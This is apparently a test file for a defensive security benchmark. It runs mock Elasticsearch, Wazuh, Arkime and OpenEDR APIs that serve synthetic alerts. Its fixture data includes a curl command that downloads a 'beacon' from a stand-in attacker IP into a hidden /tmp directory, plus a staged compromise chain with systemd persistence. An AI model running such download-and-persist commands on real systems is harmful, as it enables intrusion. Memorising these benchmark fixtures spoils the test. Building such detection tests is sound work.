"""Mock backend server for local testing.

Serves realistic responses for all tools using CU27's synthetic
data. Run this alongside the MCP server to test end-to-end workflows
without real infrastructure.

Usage:
    python tests/mock_backends.py --data-dir ../results/20260305-183155-4ed417/data

Serves:
    :9200  - Elasticsearch (alerts, connections)
    :55000 - Wazuh API
    :8005  - Arkime API
    :9443  - OpenEDR API
"""

from __future__ import annotations

import argparse
import json
import re
from pathlib import Path

from fastapi import FastAPI, Request
from fastapi.responses import JSONResponse
import uvicorn

# --------------------------------------------------------------------------- #
# Data loading
# --------------------------------------------------------------------------- #

_suricata_alerts: list[dict] = []
_zeek_conns: list[dict] = []
_wazuh_alerts: list[dict] = []
_forensic_timeline: str = ""


def _parse_zeek_conn_log(path: Path) -> list[dict]:
    """Parse Zeek conn.log TSV into list of dicts."""
    lines = path.read_text().strip().split("\n")
    fields = None
    records = []
    for line in lines:
        if line.startswith("#fields"):
            fields = line.split("\t")[1:]  # skip "#fields"
            continue
        if line.startswith("#"):
            continue
        if not fields:
            continue
        values = line.split("\t")
        record = {}
        for i, f in enumerate(fields):
            val = values[i] if i < len(values) else "-"
            # Map Zeek field names to Elasticsearch-style names
            record[f] = val
        # Add ES-style fields for querying
        record["@timestamp"] = record.get("ts", "")
        record["src_ip"] = record.get("id.orig_h", "")
        record["src_port"] = record.get("id.orig_p", "")
        record["dest_ip"] = record.get("id.resp_h", "")
        record["dest_port"] = record.get("id.resp_p", "")
        records.append(record)
    return records


def load_data(data_dir: Path) -> None:
    """Load CU27 synthetic data into memory."""
    global _suricata_alerts, _zeek_conns, _wazuh_alerts, _forensic_timeline

    eve_path = data_dir / "eve.json"
    if eve_path.exists():
        _suricata_alerts = [json.loads(line) for line in eve_path.read_text().strip().split("\n") if line.strip()]
        print(f"Loaded {len(_suricata_alerts)} Suricata alerts")

    conn_path = data_dir / "conn.log"
    if conn_path.exists():
        _zeek_conns = _parse_zeek_conn_log(conn_path)
        print(f"Loaded {len(_zeek_conns)} Zeek connections")

    wazuh_path = data_dir / "wazuh_alerts.json"
    if wazuh_path.exists():
        _wazuh_alerts = [json.loads(line) for line in wazuh_path.read_text().strip().split("\n") if line.strip()]
        print(f"Loaded {len(_wazuh_alerts)} Wazuh alerts")

    timeline_path = data_dir / "forensic_timeline.txt"
    if timeline_path.exists():
        _forensic_timeline = timeline_path.read_text()
        print(f"Loaded forensic timeline ({len(_forensic_timeline)} chars)")


# --------------------------------------------------------------------------- #
# Elasticsearch mock (port 9200)
# --------------------------------------------------------------------------- #

es_app = FastAPI(title="Mock Elasticsearch")


def _filter_by_params(records: list[dict], body: dict) -> list[dict]:
    """Apply basic Elasticsearch bool/must query filtering."""
    must_clauses = body.get("query", {}).get("bool", {}).get("must", [])
    results = list(records)

    for clause in must_clauses:
        if "term" in clause:
            for field, value in clause["term"].items():
                results = [r for r in results if str(r.get(field, "")) == str(value)]
        elif "query_string" in clause:
            q = clause["query_string"].get("query", "").lower()
            results = [r for r in results if q in json.dumps(r).lower()]
        # Skip range clauses for mock (return all time ranges)

    size = body.get("size", 100)
    return results[:size]


@es_app.post("/{index}/_search")
async def es_search(index: str, request: Request):
    body = await request.json()

    # Route to correct dataset based on index pattern
    if "zeek" in index or "conn" in index:
        source_data = _zeek_conns
    else:
        # Default: suricata alerts
        source_data = _suricata_alerts

    # Handle aggregation queries
    if body.get("size") == 0 and "aggs" in body:
        agg_name = list(body["aggs"].keys())[0]
        agg_def = body["aggs"][agg_name]
        field = agg_def.get("terms", {}).get("field", "")
        top_n = agg_def.get("terms", {}).get("size", 20)

        # Count values
        counts: dict[str, int] = {}
        for record in source_data:
            val = record.get(field, "")
            if isinstance(val, dict):
                # Nested field like alert.severity
                parts = field.split(".")
                val = record
                for p in parts:
                    val = val.get(p, "") if isinstance(val, dict) else ""
            counts[str(val)] = counts.get(str(val), 0) + 1

        buckets = sorted(counts.items(), key=lambda x: -x[1])[:top_n]
        return JSONResponse({
            "aggregations": {
                agg_name: {
                    "buckets": [{"key": k, "doc_count": v} for k, v in buckets]
                }
            }
        })

    # Standard search
    filtered = _filter_by_params(source_data, body)
    hits = [{"_source": r, "_id": str(i)} for i, r in enumerate(filtered)]

    return JSONResponse({
        "hits": {
            "total": {"value": len(hits)},
            "hits": hits,
        }
    })


# --------------------------------------------------------------------------- #
# Wazuh mock (port 55000)
# --------------------------------------------------------------------------- #

wazuh_app = FastAPI(title="Mock Wazuh API")
_wazuh_token = "mock-jwt-token-bluebench"

MOCK_AGENTS = [
    {"id": "001", "name": "wazuh-manager", "ip": "10.10.3.1", "status": "active",
     "os": {"name": "Ubuntu 22.04"}},
    {"id": "002", "name": "dc-01", "ip": "10.10.5.10", "status": "active",
     "os": {"name": "Windows Server 2022"}},
    {"id": "003", "name": "web-server-01", "ip": "10.10.5.22", "status": "active",
     "os": {"name": "Ubuntu 22.04"}},
    {"id": "004", "name": "workstation-35", "ip": "10.10.5.35", "status": "active",
     "os": {"name": "Windows 11"}},
    {"id": "005", "name": "workstation-40", "ip": "10.10.5.40", "status": "disconnected",
     "os": {"name": "Windows 11"}},
]


@wazuh_app.post("/security/user/authenticate")
async def wazuh_auth():
    return JSONResponse({"data": {"token": _wazuh_token}})


@wazuh_app.get("/agents")
async def wazuh_agents(status: str = ""):
    agents = MOCK_AGENTS
    if status:
        agents = [a for a in agents if a["status"] == status]
    return JSONResponse({"data": {"affected_items": agents, "total_affected_items": len(agents)}})


@wazuh_app.get("/agents/{agent_id}/alerts")
async def wazuh_agent_alerts(agent_id: str, limit: int = 50):
    # Filter wazuh alerts by agent ID
    alerts = [a for a in _wazuh_alerts if a.get("agent", {}).get("id") == agent_id]
    return JSONResponse({"data": {"affected_items": alerts[:limit], "total_affected_items": len(alerts)}})


@wazuh_app.get("/vulnerability/{agent_id}")
async def wazuh_vulns(agent_id: str, severity: str = ""):
    # Return mock vulnerability data
    vulns = [
        {"cve": "CVE-2024-3094", "name": "xz-utils backdoor", "severity": "Critical",
         "package": {"name": "xz-utils", "version": "5.6.0"}},
        {"cve": "CVE-2023-44487", "name": "HTTP/2 Rapid Reset", "severity": "High",
         "package": {"name": "nginx", "version": "1.24.0"}},
        {"cve": "CVE-2023-38408", "name": "OpenSSH pre-auth RCE", "severity": "High",
         "package": {"name": "openssh-server", "version": "9.3p1"}},
    ]
    if severity:
        vulns = [v for v in vulns if v["severity"].lower() == severity.lower()]
    return JSONResponse({"data": {"affected_items": vulns, "total_affected_items": len(vulns)}})


# --------------------------------------------------------------------------- #
# Arkime mock (port 8005)
# --------------------------------------------------------------------------- #

arkime_app = FastAPI(title="Mock Arkime")


def _zeek_to_arkime_session(conn: dict, idx: int) -> dict:
    """Convert a Zeek conn record to Arkime session format."""
    return {
        "id": f"mock-session-{idx:04d}",
        "srcIp": conn.get("src_ip", ""),
        "srcPort": int(conn.get("src_port", 0) or 0),
        "dstIp": conn.get("dest_ip", ""),
        "dstPort": int(conn.get("dest_port", 0) or 0),
        "protocol": conn.get("proto", "tcp"),
        "firstPacket": conn.get("ts", ""),
        "databytes": int(conn.get("orig_bytes", 0) or 0) + int(conn.get("resp_bytes", 0) or 0),
        "packets": int(conn.get("orig_pkts", 0) or 0) + int(conn.get("resp_pkts", 0) or 0),
        "service": conn.get("service", ""),
        "node": "mock-node",
    }


@arkime_app.get("/api/sessions")
async def arkime_sessions(expression: str = "", length: int = 50):
    sessions = []
    for i, conn in enumerate(_zeek_conns):
        session = _zeek_to_arkime_session(conn, i)
        # Basic expression filtering
        if expression:
            match = True
            for part in expression.split("&&"):
                part = part.strip()
                if "==" in part:
                    field, val = [x.strip() for x in part.split("==")]
                    field_map = {"ip.src": "srcIp", "ip.dst": "dstIp",
                                 "port.dst": "dstPort", "port.src": "srcPort"}
                    mapped = field_map.get(field, field)
                    if str(session.get(mapped, "")) != val:
                        match = False
                        break
            if not match:
                continue
        sessions.append(session)

    return JSONResponse({
        "data": sessions[:length],
        "recordsTotal": len(_zeek_conns),
        "recordsFiltered": len(sessions),
    })


@arkime_app.get("/api/session/{session_id}/detail")
async def arkime_session_detail(session_id: str):
    # Find session by ID
    idx_match = re.search(r"(\d+)$", session_id)
    if idx_match:
        idx = int(idx_match.group(1))
        if idx < len(_zeek_conns):
            session = _zeek_to_arkime_session(_zeek_conns[idx], idx)
            session["tags"] = []
            session["huntName"] = ""
            return JSONResponse(session)
    return JSONResponse({"error": "Session not found"}, status_code=404)


@arkime_app.get("/api/connections")
async def arkime_connections(expression: str = ""):
    # Build connection graph from Zeek data
    nodes: dict[str, int] = {}
    links: dict[str, dict] = {}

    for conn in _zeek_conns:
        src = conn.get("src_ip", "")
        dst = conn.get("dest_ip", "")
        if not src or not dst:
            continue
        nodes[src] = nodes.get(src, 0) + 1
        nodes[dst] = nodes.get(dst, 0) + 1
        key = f"{src}->{dst}"
        if key not in links:
            links[key] = {"source": src, "destination": dst, "sessions": 0, "databytes": 0}
        links[key]["sessions"] += 1
        links[key]["databytes"] += int(conn.get("orig_bytes", 0) or 0) + int(conn.get("resp_bytes", 0) or 0)

    return JSONResponse({
        "nodes": [{"id": k, "sessions": v} for k, v in nodes.items()],
        "links": list(links.values()),
    })


@arkime_app.get("/api/spigraph")
async def arkime_spigraph(field: str, expression: str = ""):
    field_map = {"srcIp": "src_ip", "dstIp": "dest_ip", "dstPort": "dest_port",
                 "protocol": "proto"}
    zeek_field = field_map.get(field, field)

    counts: dict[str, dict] = {}
    for conn in _zeek_conns:
        val = str(conn.get(zeek_field, "unknown"))
        if val not in counts:
            counts[val] = {"name": val, "count": 0, "databytes": 0}
        counts[val]["count"] += 1
        counts[val]["databytes"] += int(conn.get("orig_bytes", 0) or 0) + int(conn.get("resp_bytes", 0) or 0)

    items = sorted(counts.values(), key=lambda x: -x["count"])
    return JSONResponse({"items": items})


# --------------------------------------------------------------------------- #
# OpenEDR mock (port 9443)
# --------------------------------------------------------------------------- #

edr_app = FastAPI(title="Mock OpenEDR")

MOCK_ENDPOINTS = [
    {"hostname": "web-server-01", "ip": "10.10.5.22", "os": "Ubuntu 22.04", "status": "online"},
    {"hostname": "workstation-35", "ip": "10.10.5.35", "os": "Windows 11", "status": "online"},
    {"hostname": "workstation-40", "ip": "10.10.5.40", "os": "Windows 11", "status": "offline"},
    {"hostname": "dc-01", "ip": "10.10.5.10", "os": "Windows Server 2022", "status": "online"},
]

# Synthetic process tree for the compromised host
MOCK_PROCESSES = [
    {"hostname": "web-server-01", "pid": 1, "ppid": 0, "name": "systemd", "user": "root",
     "command_line": "/sbin/init", "depth": 0, "timestamp": "2026-01-15T14:00:00Z"},
    {"hostname": "web-server-01", "pid": 1234, "ppid": 1, "name": "sshd", "user": "root",
     "command_line": "/usr/sbin/sshd -D", "depth": 1, "timestamp": "2026-01-15T14:00:01Z"},
    {"hostname": "web-server-01", "pid": 5678, "ppid": 1234, "name": "sshd", "user": "deploy",
     "command_line": "sshd: deploy [priv]", "depth": 2, "timestamp": "2026-01-15T14:02:09Z"},
    {"hostname": "web-server-01", "pid": 5679, "ppid": 5678, "name": "bash", "user": "deploy",
     "command_line": "-bash", "depth": 3, "timestamp": "2026-01-15T14:02:10Z"},
    {"hostname": "web-server-01", "pid": 5700, "ppid": 5679, "name": "sudo", "user": "deploy",
     "command_line": "sudo /bin/bash", "depth": 4, "timestamp": "2026-01-15T14:05:20Z"},
    {"hostname": "web-server-01", "pid": 5701, "ppid": 5700, "name": "bash", "user": "root",
     "command_line": "/bin/bash", "depth": 5, "timestamp": "2026-01-15T14:05:21Z"},
    {"hostname": "web-server-01", "pid": 5720, "ppid": 5701, "name": "curl", "user": "root",
     "command_line": "curl -s http://198.51.100.77/beacon -o /tmp/.hidden/beacon",
     "depth": 6, "timestamp": "2026-01-15T14:06:30Z"},
    {"hostname": "web-server-01", "pid": 5730, "ppid": 1, "name": "beacon", "user": "root",
     "command_line": "/tmp/.hidden/beacon", "depth": 1, "timestamp": "2026-01-15T14:07:40Z"},
]

MOCK_DETECTIONS = [
    {"hostname": "web-server-01", "severity": "critical", "rule_name": "Suspicious binary in /tmp",
     "description": "Binary executed from /tmp/.hidden directory", "timestamp": "2026-01-15T14:07:40Z"},
    {"hostname": "web-server-01", "severity": "high", "rule_name": "SSH brute force followed by login",
     "description": "Multiple failed SSH attempts from 185.220.101.42 followed by successful auth",
     "timestamp": "2026-01-15T14:02:09Z"},
    {"hostname": "web-server-01", "severity": "high", "rule_name": "Privilege escalation via sudo",
     "description": "User 'deploy' escalated to root via sudo /bin/bash",
     "timestamp": "2026-01-15T14:05:20Z"},
    {"hostname": "web-server-01", "severity": "medium", "rule_name": "Systemd service created",
     "description": "New service system-health-check.service pointing to /tmp/.hidden/beacon",
     "timestamp": "2026-01-15T14:07:30Z"},
]

MOCK_FILE_EVENTS = [
    {"hostname": "web-server-01", "timestamp": "2026-01-15T14:06:30Z", "type": "create",
     "path": "/tmp/.hidden/beacon", "hash": "a1b2c3d4e5f6..."},
    {"hostname": "web-server-01", "timestamp": "2026-01-15T14:07:30Z", "type": "create",
     "path": "/etc/systemd/system/system-health-check.service", "hash": ""},
    {"hostname": "web-server-01", "timestamp": "2026-01-15T14:03:20Z", "type": "modify",
     "path": "/etc/passwd", "hash": "f6e5d4c3b2a1..."},
    {"hostname": "web-server-01", "timestamp": "2026-01-15T14:03:35Z", "type": "modify",
     "path": "/etc/shadow", "hash": "1a2b3c4d5e6f..."},
    {"hostname": "web-server-01", "timestamp": "2026-01-15T14:03:50Z", "type": "modify",
     "path": "/etc/sudoers", "hash": "6f5e4d3c2b1a..."},
]

MOCK_NETWORK_EVENTS = [
    {"hostname": "web-server-01", "timestamp": "2026-01-15T14:06:30Z", "process_name": "curl",
     "pid": 5720, "dest_ip": "198.51.100.77", "dest_port": 80},
    {"hostname": "web-server-01", "timestamp": "2026-01-15T14:07:41Z", "process_name": "beacon",
     "pid": 5730, "dest_ip": "203.0.113.45", "dest_port": 443},
    {"hostname": "web-server-01", "timestamp": "2026-01-15T14:08:41Z", "process_name": "beacon",
     "pid": 5730, "dest_ip": "203.0.113.45", "dest_port": 443},
    {"hostname": "web-server-01", "timestamp": "2026-01-15T14:09:41Z", "process_name": "beacon",
     "pid": 5730, "dest_ip": "203.0.113.45", "dest_port": 443},
]


@edr_app.get("/api/v1/endpoints")
async def edr_endpoints(status: str = ""):
    eps = MOCK_ENDPOINTS
    if status:
        eps = [e for e in eps if e["status"] == status]
    return JSONResponse({"data": eps})


@edr_app.get("/api/v1/processes")
async def edr_processes(hostname: str = "", pid: int = 0, timerange: str = ""):
    procs = [p for p in MOCK_PROCESSES if not hostname or p["hostname"] == hostname]
    if pid:
        procs = [p for p in procs if p["pid"] == pid or p["ppid"] == pid]
    return JSONResponse({"data": procs})


@edr_app.get("/api/v1/file_events")
async def edr_file_events(hostname: str = "", path: str = "", type: str = ""):
    events = [e for e in MOCK_FILE_EVENTS if not hostname or e["hostname"] == hostname]
    if path:
        events = [e for e in events if path in e["path"]]
    if type:
        events = [e for e in events if e["type"] == type]
    return JSONResponse({"data": events})


@edr_app.get("/api/v1/network_events")
async def edr_network_events(hostname: str = "", dest_ip: str = "", dest_port: int = 0):
    events = [e for e in MOCK_NETWORK_EVENTS if not hostname or e["hostname"] == hostname]
    if dest_ip:
        events = [e for e in events if e["dest_ip"] == dest_ip]
    if dest_port:
        events = [e for e in events if e["dest_port"] == dest_port]
    return JSONResponse({"data": events})


@edr_app.get("/api/v1/detections")
async def edr_detections(hostname: str = "", severity: str = ""):
    dets = MOCK_DETECTIONS
    if hostname:
        dets = [d for d in dets if d["hostname"] == hostname]
    if severity:
        dets = [d for d in dets if d["severity"] == severity]
    return JSONResponse({"data": dets})


# --------------------------------------------------------------------------- #
# Runner — start all mock backends
# --------------------------------------------------------------------------- #

def main():
    parser = argparse.ArgumentParser(description="CU27 Mock Backends")
    parser.add_argument(
        "--data-dir",
        default="../results/20260305-183155-4ed417/data",
        help="Path to CU27 synthetic data directory",
    )
    args = parser.parse_args()

    data_dir = Path(args.data_dir)
    if not data_dir.exists():
        # Try relative to script location
        data_dir = Path(__file__).parent.parent.parent / args.data_dir.lstrip("../")
    if not data_dir.exists():
        print(f"Data directory not found: {args.data_dir}")
        print("Generate data first via the Blue-Bench data pipeline")
        return

    load_data(data_dir)

    import threading

    def run_app(app, port, name):
        print(f"Starting {name} on :{port}")
        uvicorn.run(app, host="127.0.0.1", port=port, log_level="warning")

    servers = [
        (es_app, 9200, "Elasticsearch"),
        (wazuh_app, 55000, "Wazuh API"),
        (arkime_app, 8005, "Arkime"),
        (edr_app, 9443, "OpenEDR"),
    ]

    threads = []
    for app, port, name in servers:
        t = threading.Thread(target=run_app, args=(app, port, name), daemon=True)
        t.start()
        threads.append(t)

    print(f"\nAll mock backends running. Press Ctrl+C to stop.\n")
    print("Endpoints:")
    print("  Elasticsearch:  http://127.0.0.1:9200")
    print("  Wazuh API:      http://127.0.0.1:55000")
    print("  Arkime:         http://127.0.0.1:8005")
    print("  OpenEDR:        http://127.0.0.1:9443")
    print()
    print("MCP server config for local testing:")
    print("  elastic.url:    http://127.0.0.1:9200")
    print("  wazuh.api_url:  http://127.0.0.1:55000")
    print("  arkime.url:     http://127.0.0.1:8005")
    print("  openedr.url:    http://127.0.0.1:9443")

    try:
        for t in threads:
            t.join()
    except KeyboardInterrupt:
        print("\nShutting down mock backends.")


if __name__ == "__main__":
    main()
